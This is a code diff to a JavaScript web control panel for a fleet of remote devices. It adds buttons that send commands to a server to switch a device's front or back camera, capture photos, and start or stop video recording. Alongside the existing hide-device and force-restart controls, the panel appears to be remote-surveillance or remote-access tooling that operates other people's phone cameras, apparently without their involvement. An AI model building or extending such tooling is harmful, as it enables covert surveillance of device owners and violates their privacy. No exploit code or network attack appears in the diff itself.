@@ -6,6 +6,7 @@ const app = {
     currentView: 'grid',
     lastDataHash: '',
     currentDevice: null,
+    currentCamera: 'front', // Default camera
 
     init: function() {
         document.addEventListener('DOMContentLoaded', function() {
@@ -133,6 +134,36 @@ const app = {
         // Save settings button
         const saveSettingsBtn = document.getElementById('saveSettingsBtn');
         if (saveSettingsBtn) saveSettingsBtn.addEventListener('click', app.saveSettings);
+
+        // 📸 NEW: Camera control buttons
+        const frontCameraBtn = document.getElementById('frontCameraBtn');
+        const backCameraBtn = document.getElementById('backCameraBtn');
+        const capturePhotoBtn = document.getElementById('capturePhotoBtn');
+        const recordVideoBtn = document.getElementById('recordVideoBtn');
+
+        if (frontCameraBtn) {
+            frontCameraBtn.addEventListener('click', function() {
+                app.activateCamera('front');
+            });
+        }
+
+        if (backCameraBtn) {
+            backCameraBtn.addEventListener('click', function() {
+                app.activateCamera('back');
+            });
+        }
+
+        if (capturePhotoBtn) {
+            capturePhotoBtn.addEventListener('click', function() {
+                app.capturePhoto();
+            });
+        }
+
+        if (recordVideoBtn) {
+            recordVideoBtn.addEventListener('click', function() {
+                app.recordVideo();
+            });
+        }
     },
 
     loadAllDevices: async function() {
@@ -540,6 +571,9 @@ const app = {
             toggleText.textContent = deviceData.is_hidden ? 'Hide Device' : 'Show Device';
         }
         
+        // Reset camera selection
+        app.resetCameraSelection();
+        
         // Show modal
         const modal = document.getElementById('deviceModal');
         modal.style.display = 'block';
@@ -628,6 +662,137 @@ const app = {
         }
     },
 
+    // 📸 NEW: CAMERA CONTROL FUNCTIONS
+
+    activateCamera: function(cameraType) {
+        if (!app.currentDevice) return;
+        
+        // Update UI
+        app.resetCameraSelection();
+        
+        const frontCameraBtn = document.getElementById('frontCameraBtn');
+        const backCameraBtn = document.getElementById('backCameraBtn');
+        
+        if (cameraType === 'front' && frontCameraBtn) {
+            frontCameraBtn.classList.add('active');
+            app.currentCamera = 'front';
+            app.showToast('Front camera activated', 'info');
+        } else if (cameraType === 'back' && backCameraBtn) {
+            backCameraBtn.classList.add('active');
+            app.currentCamera = 'back';
+            app.showToast('Back camera activated', 'info');
+        }
+        
+        // Send camera activation command to server
+        app.sendCameraCommand('activate', cameraType);
+    },
+
+    resetCameraSelection: function() {
+        const frontCameraBtn = document.getElementById('frontCameraBtn');
+        const backCameraBtn = document.getElementById('backCameraBtn');
+        
+        if (frontCameraBtn) frontCameraBtn.classList.remove('active');
+        if (backCameraBtn) backCameraBtn.classList.remove('active');
+        
+        // Default to front camera
+        app.currentCamera = 'front';
+    },
+
+    capturePhoto: function() {
+        if (!app.currentDevice) {
+            app.showToast('Please select a device first', 'warning');
+            return;
+        }
+        
+        if (!app.currentCamera) {
+            app.showToast('Please select a camera first', 'warning');
+            return;
+        }
+        
+        app.showToast(`Capturing photo with ${app.currentCamera} camera...`, 'info');
+        
+        // Send capture command to server
+        app.sendCameraCommand('capture', app.currentCamera);
+    },
+
+    recordVideo: function() {
+        if (!app.currentDevice) {
+            app.showToast('Please select a device first', 'warning');
+            return;
+        }
+        
+        if (!app.currentCamera) {
+            app.showToast('Please select a camera first', 'warning');
+            return;
+        }
+        
+        // Toggle recording state
+        const recordVideoBtn = document.getElementById('recordVideoBtn');
+        const isRecording = recordVideoBtn.classList.contains('recording');
+        
+        if (isRecording) {
+            // Stop recording
+            recordVideoBtn.classList.remove('recording');
+            recordVideoBtn.innerHTML = '<i class="fas fa-video"></i> Record Video';
+            app.showToast('Video recording stopped', 'info');
+            app.sendCameraCommand('stop_video', app.currentCamera);
+        } else {
+            // Start recording
+            recordVideoBtn.classList.add('recording');
+            recordVideoBtn.innerHTML = '<i class="fas fa-stop"></i> Stop Recording';
+            app.showToast('Video recording started...', 'info');
+            app.sendCameraCommand('record_video', app.currentCamera);
+        }
+    },
+
+    sendCameraCommand: async function(action, cameraType) {
+        if (!app.currentDevice) return;
+        
+        try {
+            const response = await fetch(`${app.COMMANDS_URL}/camera-command`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    device_id: app.currentDevice.device_id,
+                    action: action,
+                    camera_type: cameraType,
+                    source: 'web_panel',
+                    timestamp: new Date().toISOString()
+                })
+            });
+            
+            const result = await response.json();
+            
+            if (result.success) {
+                let message = '';
+                switch (action) {
+                    case 'activate':
+                        message = `${cameraType} camera activated`;
+                        break;
+                    case 'capture':
+                        message = `Photo captured with ${cameraType} camera`;
+                        break;
+                    case 'record_video':
+                        message = `Video recording started with ${cameraType} camera`;
+                        break;
+                    case 'stop_video':
+                        message = 'Video recording stopped';
+                        break;
+                    default:
+                        message = 'Camera command executed';
+                }
+                app.showToast(message, 'success');
+            } else {
+                app.showToast('Camera command failed', 'error');
+            }
+        } catch (error) {
+            console.error('Camera command error:', error);
+            app.showToast('Network error - camera command not sent', 'error');
+        }
+    },
+
     forceRestart: function() {
         if (!app.currentDevice) return;
         
@@ -671,7 +836,7 @@ const app = {
         const toast = document.createElement('div');
         toast.className = `toast-message ${type}`;
         toast.innerHTML = `
-            <i class="fas ${type === 'error' ? 'fa-exclamation-circle' : type === 'warning' ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i>
+            <i class="fas ${type === 'error' ? 'fa-exclamation-circle' : type === 'warning' ? 'fa-exclamation-triangle' : type === 'info' ? 'fa-info-circle' : 'fa-check-circle'}"></i>
             <span>${message}</span>
         `;
         
@@ -700,6 +865,7 @@ const app = {
                 .toast-message.success { border-left: 4px solid var(--success); }
                 .toast-message.error { border-left: 4px solid var(--danger); }
                 .toast-message.warning { border-left: 4px solid var(--warning); }
+                .toast-message.info { border-left: 4px solid var(--info); }
                 @keyframes slideInRight {
                     from { transform: translateX(100%); opacity: 0; }
                     to { transform: translateX(0); opacity: 1; }
